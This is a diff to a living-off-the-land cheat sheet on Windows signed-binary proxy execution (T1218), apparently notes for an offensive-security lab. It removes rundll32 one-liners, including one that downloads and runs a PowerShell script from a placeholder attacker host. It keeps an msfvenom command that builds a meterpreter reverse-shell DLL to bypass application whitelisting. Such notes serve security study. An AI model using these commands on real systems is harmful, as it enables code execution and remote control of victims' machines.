@@ -25,18 +25,6 @@ Findstr is a Microsoft built-in tool used to find text and string patterns in fi
 
 Windows Management Instrumentation (WMIC) is used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution (T1218).
 
-
-
-  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
-                                Execute a calc.exe binary (embeds a JavaScript component, `eval()`, to execute the `calc.exe` binary)
-                                rundll32.exe can run arbitrary payloads and execute JavaScript and PowerShell scripts.
-                                The MITRE ATT&CK framework identifies this as Signed Binary Proxy Execution:
-                                `Rundll32` and refers to it as T1218
-  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
-                                Execute PowerShell scripts using the `rundll32.exe`. The following command runs a JavaScript that executes
-                                a PowerShell script to download from a remote website using `rundll32.exe`. As a result, a copy of the `script.ps1`
-                                downloaded into memory on the target machine
-
 Application Whitelisting Bypasses:
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
                                 Create a malicious DLL file using `msvenom` and set up our  Metasploit listener to receive a reverse shell
